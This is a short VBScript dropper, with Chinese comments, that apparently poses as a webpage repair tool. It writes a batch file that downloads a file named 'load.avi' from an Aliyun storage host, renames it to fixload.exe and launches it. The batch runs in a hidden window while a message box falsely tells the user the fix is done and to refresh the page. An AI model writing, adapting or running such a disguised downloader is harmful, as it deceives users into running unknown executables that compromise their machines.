Option Explicit

Dim fso, batFile, currentDir, WshShell

' 获取当前目录
Set fso = CreateObject("Scripting.FileSystemObject")
currentDir = fso.GetAbsolutePathName(".")

' 创建 updat.bat 文件的路径
batFile = currentDir & "\updat.bat"

' 创建 updat.bat 文件的内容
Dim bat
Set bat = fso.CreateTextFile(batFile, True)

bat.WriteLine("@echo off")
bat.WriteLine("echo Downloading load.avi...")
bat.WriteLine("echo Set objXMLHTTP = CreateObject(""MSXML2.ServerXMLHTTP.6.0"") > download.vbs")
bat.WriteLine("echo objXMLHTTP.Open ""GET"", ""https://updatesdwn.oss-cn-shanghai.aliyuncs.com/load.avi"", False >> download.vbs")
bat.WriteLine("echo objXMLHTTP.Send >> download.vbs")
bat.WriteLine("echo If objXMLHTTP.Status = 200 Then >> download.vbs")
bat.WriteLine("echo   Set objStream = CreateObject(""ADODB.Stream"") >> download.vbs")
bat.WriteLine("echo   objStream.Type = 1 >> download.vbs")
bat.WriteLine("echo   objStream.Open >> download.vbs")
bat.WriteLine("echo   objStream.Write objXMLHTTP.ResponseBody >> download.vbs")
bat.WriteLine("echo   objStream.SaveToFile ""load.avi"", 2 >> download.vbs")
bat.WriteLine("echo   objStream.Close >> download.vbs")
bat.WriteLine("echo End If >> download.vbs")
bat.WriteLine("cscript //nologo download.vbs")
bat.WriteLine("del download.vbs")
bat.WriteLine("echo Renaming load.avi to fixload.exe...")
bat.WriteLine("ren load.avi fixload.exe")
bat.WriteLine("echo Executing fixload.exe...")
bat.WriteLine("start fixload.exe")
bat.WriteLine("echo Done.")

bat.Close

' 提示用户
MsgBox "修复完成！请刷新网页即可", vbInformation, "提示"

' 创建 WshShell 对象
Set WshShell = CreateObject("WScript.Shell")

' 运行 updat.bat
WshShell.Run batFile, 0, False

' 清理对象
Set fso = Nothing
Set WshShell = Nothing
